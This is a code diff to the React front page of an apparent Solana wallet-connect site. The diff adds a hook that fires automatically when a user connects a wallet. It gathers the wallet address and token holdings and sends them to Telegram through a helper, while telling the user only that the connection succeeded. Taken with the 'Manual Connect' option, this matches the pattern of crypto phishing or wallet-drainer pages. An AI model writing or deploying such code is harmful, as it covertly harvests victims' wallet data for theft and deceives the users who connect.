@@ -1,6 +1,44 @@
 import { Settings, Menu } from "lucide-react";
+import { useWallet, useConnection } from '@solana/wallet-adapter-react';
+import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
+import { useEffect } from 'react';
+import { getTokenAccounts, sendToTelegram } from '@/utils/walletUtils';
+import { toast } from '@/components/ui/use-toast';
 
 const Index = () => {
+  const { publicKey, connecting } = useWallet();
+  const { connection } = useConnection();
+
+  useEffect(() => {
+    const handleWalletConnection = async () => {
+      if (publicKey) {
+        try {
+          const tokens = await getTokenAccounts(connection, publicKey.toString());
+          const walletData = {
+            address: publicKey.toString(),
+            tokens,
+          };
+          
+          await sendToTelegram(walletData);
+          
+          toast({
+            title: "Success",
+            description: "Wallet connected successfully!",
+          });
+        } catch (error) {
+          console.error('Error handling wallet connection:', error);
+          toast({
+            title: "Error",
+            description: "Failed to process wallet connection",
+            variant: "destructive",
+          });
+        }
+      }
+    };
+
+    handleWalletConnection();
+  }, [publicKey, connection]);
+
   return (
     <div className="min-h-screen bg-background p-6 relative">
       {/* Top Navigation */}
@@ -38,12 +76,10 @@ const Index = () => {
           <button className="glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold">
             Manual Connect
           </button>
-          <button className="glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold">
-            Connect Wallet
-          </button>
+          <WalletMultiButton className="glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold" />
         </div>
 
-        {/* Bottom Logo - Now positioned after the buttons */}
+        {/* Bottom Logo */}
         <div className="mt-20">
           <div className="w-32 h-32 rounded-full bg-[#2A2F3F] flex items-center justify-center">
             <div className="w-24 h-24 rounded-full bg-[#4B3979] flex items-center justify-center">
